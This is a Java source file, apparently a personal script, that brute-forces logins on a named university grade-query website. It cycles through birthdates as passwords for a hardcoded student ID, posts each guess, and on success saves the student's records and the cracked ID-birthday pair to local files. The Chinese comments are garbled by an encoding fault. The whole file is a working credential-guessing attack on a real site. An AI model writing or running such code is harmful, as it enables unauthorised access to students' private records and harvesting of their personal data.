package com.xz.http;
import java.io.*;
import java.net.URI;
import java.util.*;

import org.apache.http.client.*;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.*;
import org.apache.http.impl.client.*;
import org.apache.http.message.*;
import org.apache.http.util.EntityUtils;
import org.apache.http.*;
import org.apache.*;
import org.w3c.dom.Entity;


public class MyHttpClient implements Runnable{
	
	String id = "121542307";
	int month = 1;
	
	MyHttpClient(){}
	public MyHttpClient(String id, int month) {
		super();
		this.id = id;
		this.month = month;
	}

	public  void run() {
		System.out.println(Thread.currentThread().getName()+"开始运行");
		String url = "http://bm.gduf.edu.cn/tycx/Index.asp";
		String yearStr,monthStr,dayStr;
		String password = "";
		boolean flag = false;
		
		outer:
		for (int year=1994; year <= 1994; year++) {
			for (int innerMonth = month; innerMonth <= month; innerMonth++) {
				if(innerMonth<10){
					monthStr = "0"+innerMonth;
				}else{
					monthStr = ""+innerMonth;
				}
				for (int day = 1; day <= 31; day++) {
					if(day<10){
						dayStr = "0"+day;
					}else{
						dayStr = ""+day;
					}
					password = year+monthStr+dayStr;
					
					//��ȡҳ�棬����ɹ�����true
					try {
						flag = getPage(id, password,url);
					} catch (Exception e) {
						System.out.println("�����쳣");
						e.printStackTrace();
					}
					//����ɹ�����������ѭ��������outer���
					if(flag)
						break outer;
				}
			}
		}
		
		
	}

	private  boolean getPage(String id, String pwd,String targetUrl)
			throws UnsupportedEncodingException, IOException,
			ClientProtocolException {
		HttpClient httpClient = new DefaultHttpClient();
		HttpPost post = new HttpPost();
		post.setURI(URI.create(targetUrl));
		
		List list = new ArrayList();
		list.add(new BasicNameValuePair("xuehao",id));
		list.add(new BasicNameValuePair("birthday",pwd));
		
		post.setEntity(new UrlEncodedFormEntity(list, "gb2312"));
		HttpResponse res;
		try{
			res = httpClient.execute(post);
		}catch (Exception e) {
			System.out.println("���ӳ�ʱ");
			return false;
		}
		
		if(res.getStatusLine().getStatusCode()==200){
			HttpEntity httpEntity = res.getEntity();
			String pageStr = new String(EntityUtils.toString(httpEntity).getBytes("ISO_8859_1"),"gb2312");
//			System.out.println(pageStr);
			String[] pageLines = pageStr.split("\n");
//			for (int i = 0; i < pageLines.length; i++) {
//				System.out.println(i+pageLines[i]);
//			}
			//�����44�а���������Ϣ��˵��ѧ�������루���ڣ���ƥ�䣬����false
			if(pageLines[44].contains("ѧ�š����벻��ȷ��û�гɼ�")){
				System.out.println(pwd+pageLines[44]);
				return false;
			}else{
				//����ɹ����ָ��44�е���Ϣ�����������true
				String idAndDate = "id:"+id+"\t����:"+pwd+"\n";
				System.out.println(idAndDate);
				String[] infos = pageLines[44].split("<td");
				for (int i = 0; i < infos.length; i++) {
					System.out.println(infos[i]);
				}
				File file = new File("G:/J/testClient/tcInfo_"+id+".txt");
				FileOutputStream fo = new FileOutputStream(file,false);
				FileOutputStream fo_birth = new FileOutputStream(new File("G:/J/testClient/bthInfo_.txt"),true);
				fo_birth.write(idAndDate.getBytes());
				fo.write(pageLines[44].getBytes());
				return true;
			}
		}else{
			System.out.println("��ȡҳ�������");
		}
		return false;
	}

}
